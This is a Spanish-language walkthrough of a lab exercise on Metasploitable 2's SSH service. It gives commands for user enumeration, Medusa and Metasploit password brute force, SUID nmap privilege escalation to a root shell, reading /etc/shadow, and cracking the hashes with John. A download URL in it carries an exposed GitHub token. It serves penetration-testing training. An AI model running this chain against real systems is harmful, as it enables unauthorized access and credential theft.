# Metasploitable 2 — Explotación del Puerto 22 (SSH)

Writeup completo de la explotación del servicio SSH en Metasploitable 2, cubriendo dos métodos: explotación manual con herramientas independientes y explotación mediante Metasploit Framework.

---

## Entorno

| Parámetro | Valor |
|---|---|
| Red de laboratorio | `192.168.30.0/24` |
| IP objetivo (Metasploitable 2) | `192.168.30.130` |
| Puerto objetivo | `22/tcp` |
| Servicio detectado | OpenSSH 4.7p1 Debian 8ubuntu1 |
| Vulnerabilidad explotada | Username Enumeration (OpenSSH 2.3 < 7.7) |

---

## Requisitos previos

- Kali Linux (o cualquier distro con las herramientas listadas)
- Metasploitable 2 corriendo en la misma red
- Herramientas: `nmap`, `searchsploit`, `python3`, `medusa`, `john`, `msfconsole`

---

## Método 1 — Explotación manual

### 1. Descubrimiento de red

```bash
ifconfig
```
Identifica la interfaz activa y la red a la que perteneces.

```bash
nmap -sn 192.168.30.0/24
```
Descubre los hosts activos en la red. El objetivo se encuentra en `192.168.30.130`.

---

### 2. Enumeración de servicios

```bash
nmap -sV 192.168.30.130 -p-
```
Identifica todos los puertos abiertos y las versiones de los servicios. Resultado relevante:

```
22/tcp  open  ssh  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
```

---

### 3. Búsqueda de exploits

```bash
nmap -sV -p22 192.168.30.130 -oA results.txt
ls results.txt.*
searchsploit -x --nmap results.txt.xml
```
Se identifica la vulnerabilidad **Username Enumeration** presente en OpenSSH versiones 2.3 a 7.7.

---

### 4. Enumeración de usuarios válidos

Descarga del exploit:

```bash
wget https://raw.githubusercontent.com/rberrospit/UNI-CBN04/refs/heads/main/ssh-enum.py?token=GHSAT0AAAAAADBMMK3NWUWIFVUYNQNJ7LLO2BXCDQA
cp ssh-enum.py\?token=GHSAT0AAAAAADBMMK3NWUWIFVUYNQNJ7LLO2BXCDQA ssh-enum.py
rm ssh-enum.py\?token=GHSAT0AAAAAADBMMK3NWUWIFVUYNQNJ7LLO2BXCDQA
```

Preparación del entorno virtual:

```bash
python3 -m venv venv
source venv/bin/activate
pip install paramiko==2.11.0
```

Ejecución de la enumeración:

```bash
python ssh-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.30.130 > usuarios.txt
```

Filtrado de resultados:

```bash
grep "found\!" usuarios.txt > logs.txt
awk '{print $2}' logs.txt > users.txt
rm usuarios.txt
rm logs.txt
```

---

### 5. Ataque de diccionario (fuerza bruta SSH)

Preparación:

```bash
echo "user" > ssh-user.txt
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/refs/heads/master/data/wordlists/unix_users.txt
```

Ataque con Medusa:

```bash
medusa -U ssh-user.txt -P unix_users.txt -h 192.168.30.130 -M ssh
```

Resultado obtenido:

```
usuario:  user
password: user
```

---

### 6. Acceso SSH

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa user@192.168.30.130
```

---

### 7. Escalada de privilegios

Búsqueda de binarios con SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Se detecta que `nmap` tiene el bit SUID activado. Se aprovecha el modo interactivo de versiones antiguas de nmap:

```bash
nmap --interactive
!sh
```

Esto otorga una shell como `root`. Desde ahí se extraen los archivos de credenciales:

```bash
cat /etc/passwd
cat /etc/shadow
```

---

### 8. Crackeo de hashes

Con los hashes extraídos de `/etc/shadow` se ejecuta John the Ripper:

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

---

## Método 2 — Metasploit Framework

```bash
msfconsole
```

```bash
use 75
set RHOSTS 192.168.30.130
set USER_FILE ./userssh.txt
set PASS_FILE ./unix_users.txt
run
```

Resultado:

```
192.168.30.130:22 - Success: 'user:user'
uid=1001(user) gid=1001(user) groups=1001(user)
Linux metasploitable 2.6.24-16-server
```

---

## Resumen del flujo

```
Descubrimiento de red
        ↓
Escaneo de puertos y versiones (nmap)
        ↓
Identificación de vulnerabilidad (searchsploit)
        ↓
Enumeración de usuarios válidos (ssh-enum.py)
        ↓
Fuerza bruta de credenciales (medusa / metasploit)
        ↓
Acceso SSH
        ↓
Escalada de privilegios (SUID nmap)
        ↓
Extracción y crackeo de hashes (john)
```

---

## Advertencia

Este material es exclusivamente para uso en entornos de laboratorio controlados como Metasploitable 2. Aplicar estas técnicas sobre sistemas sin autorización explícita es ilegal.
